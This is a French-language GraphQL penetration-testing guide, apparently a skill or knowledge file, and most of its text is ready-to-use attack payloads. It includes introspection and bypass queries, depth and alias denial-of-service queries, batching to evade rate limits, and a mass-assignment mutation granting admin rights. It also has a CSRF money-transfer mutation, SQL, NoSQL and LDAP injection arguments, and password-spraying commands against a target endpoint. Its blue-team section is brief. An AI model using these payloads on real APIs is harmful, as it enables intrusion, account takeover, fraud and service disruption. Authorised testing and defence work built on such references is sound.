---
name: graphql-hacking-guide
description: Guide complet de pentest GraphQL — introspection, query batching, injections, CSRF, DoS, outils et méthodologie
category: cybersecurite
---

# GraphQL Hacking — Guide Avancé

## Introduction

GraphQL est un langage de requête pour API qui expose un endpoint unique (souvent `/graphql`, `/graphql/`, `/v1/graphql`, `/api/gql`). Contrairement à REST, le client contrôle la forme des données, ouvrant des vecteurs d'attaque uniques.

## Découverte d'un Endpoint GraphQL

### Endpoints courants
```bash
/graphql
/graphql/console
/graphiql
/altair
/voyager
/playground
/api/graphql
/api/v1/graphql
/gql
/graph
```

### Détection via la réponse
```http
POST /graphql HTTP/1.1
Content-Type: application/json

{"query": "{ __typename }"}
```
Réponse: `{"data": {"__typename": "Query"}}` → c'est du GraphQL.

### Détection via les messages d'erreur
```json
{"query": "{invalid}"}
// Réponse d'erreur GraphQL: {"errors": [...]}
```

## Introspection — Cartographie Complète

### Requête d'introspection complète
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      args { ...InputValue }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

### Bypass d'introspection
```graphql
# Content-Type alternatif
Content-Type: application/x-www-form-urlencoded

# Encodage GET
GET /graphql?query={__schema{types{name,fields{name}}}}

# En-tête spécial
X-GraphQL-Test: introspection

# Variables déguisées
{"variables": "{}", "query": "...{__schema{types{name}}}"}
```

## Attaques sur les Champs

### Query Depth Attack (DoS)
```graphql
# Requête profondément imbriquée pour épuiser les ressources
query {
  user(id: 1) {
    posts {
      comments {
        user {
          posts {
            comments {
              user { name }
            }
          }
        }
      }
    }
  }
}
```

### Alias Batching (Rate Limit Bypass)
```graphql
# Utiliser des alias pour contourner les limites de rate
query {
  u0: user(id: 1) { ... }
  u1: user(id: 2) { ... }
  u2: user(id: 3) { ... }
  # ...jusqu'à 1000 alias
}
```

### Resource Exhaustion / DoS
```graphql
# Demander des champs coûteux
query {
  __type(name: "User") {
    fields {
      type {
        fields {
          type {
            fields { name }
          }
        }
      }
    }
  }
}
```

### Circular Query (Depth Limit Bypass)
```graphql
# Fragments cycliques si non protégés
query {
  user(id: 1) {
    ...u
  }
}
fragment u on User {
  friends {
    ...u
  }
}
```

## Attaques sur les Mutations

### Mass Assignment / IDOR via Mutation
```graphql
mutation {
  updateUser(id: 1, input: {
    role: "admin"
    isAdmin: true
    email: "attacker@evil.com"
    password: "hacked123"
  }) {
    id
    role
  }
}
```

### Race Condition sur Mutations
```graphql
# Envoyer plusieurs mutations simultanément
# pour exploiter des TOCTOU
mutation {
  redeemCoupon(code: "FREEGIFT") {
    success
  }
}
# Envoyer 10x cette mutation en parallèle
```

### CSRF via Mutation
```graphql
# GET-based mutation (si supporté)
GET /graphql?query=mutation{transferMoney(to:"attacker",amount:999999){success}}

# Si Content-Type non vérifié
# Utiliser application/x-www-form-urlencoded
```

## Injections dans GraphQL

### SQL Injection dans les arguments
```graphql
query {
  user(id: "1 UNION SELECT * FROM passwords") {
    id
    name
    email
  }
}
```

### NoSQL Injection
```graphql
query {
  user(login: { "$ne": "" }) {
    id
    name
    password
  }
}
# login[$ne]=  (en URL-encoded)
```

### LDAP Injection
```graphql
query {
  search(term: "*") {
    results
  }
}
```

### Injection dans les Directives
```graphql
# @skip et @include peuvent révéler des données
query {
  users {
    name
    ssn @skip(if: false)
  }
}
```

## GraphQL Batching Attack

### Requêtes en parallèle par champs de batche
```graphql
[{
  "query": "{ __typename }"
},
{
  "query": "{ __typename }"
},
# ... 1000+ requêtes
]
```

### Exploitation via `batch` queries
```graphql
query {
  batch {
    user(id: 1) { name }
    user(id: 2) { name }
    # Bruteforce d'IDs
  }
}
```

## Outils Essentiels

| Outil | Usage |
|-------|-------|
| **InQL** | Burp Extension — scan d'API GraphQL |
| **GraphQLMap** | Automatisation d'audit de sécurité |
| **GraphQL Voyager** | Visualisation du schéma |
| **GraphQL IDE (GraphiQL/Altair)** | Exploration manuelle |
| **clairvoyance** | Reconstruction de schéma quand introspection désactivée |
| **graphw00f** | Fingerprinting middleware GraphQL |
| **GraphQL-Cop** | Templates de sécurité automatisés |
| **BatchQL** | Détection de vulnérabilités |
| **CrackQL** | Password spraying + batching |

## Bypass et Techniques Avancées

### 1. Introspection Désactivée → Dumping de Schéma

```bash
# Clairvoyance — reconstruit via fuzzing
clairvoyance http://target.com/graphql

# Fuzzing de champs
# Utiliser GraphQL Cop ou un wordlist de noms de champs
```

### 2. Depth Limiting Bypass
```graphql
# Éclatement en sous-requêtes
query {
  user(id: 1) { ...UserFields }
  _fake: user(id: 2) { ...UserFields }
}
```

### 3. Alias Bypass for Pagination
```graphql
query {
  a1: users(first: 1, after: null) { pageInfo { endCursor } }
  a2: users(first: 1, after: null) { pageInfo { endCursor } }
}
```

### 4. Mutation Bruteforce
```bash
# CrackQL pour password spraying
crackql -e http://target.com/graphql -m login -u users.txt -p passwords.txt
```

### 5. BatchQL — GraphQL Brute Force
```bash
# Utiliser des batchs pour tester des mots de passe
# Contourne les rate limiters basés sur IP
batchql -e http://target.com/graphql -i login -u admin -p rockyou.txt -b 10
```

## Protection (Blue Team)

### Configurations recommandées
```graphql
# Limiter la profondeur (max 6-7)
# Limiter le coût des requêtes
# Limiter le batching
# Désactiver l'introspection en production
# Rate limiter par IP et par token
# Validation de Content-Type
```

## Checklist Pentest GraphQL

1. Découvrir l'endpoint GraphQL
2. Vérifier introspection activée
3. Cartographier types, mutations, subscriptions
4. Tester IDOR sur les arguments
5. Tester mass assignment sur les mutations
6. Tester injections (SQL, NoSQL, LDAP)
7. Tester query depth/aliasing DOS
8. Tester batching/rate limit bypass
9. Tester CSRF (GET-based mutations)
10. Tester race conditions
11. Tester les directives (@skip/@include)
12. Tester l'auth sur toutes les mutations
13. Tester les subscriptions (WebSocket auth)

## Ressources

- **HackTricks GraphQL**: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql/index.html
- **PayloadsAllTheThings GraphQL**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
- **InQL (Burp)**: https://github.com/doyensec/inql
- **graphql-map**: https://github.com/swisskyrepo/GraphQLmap
- **clairvoyance**: https://github.com/nikitastupin/clairvoyance
- **graphw00f**: https://github.com/dolevf/graphw00f
- **GraphQL-Cop**: https://github.com/dolevf/graphql-cop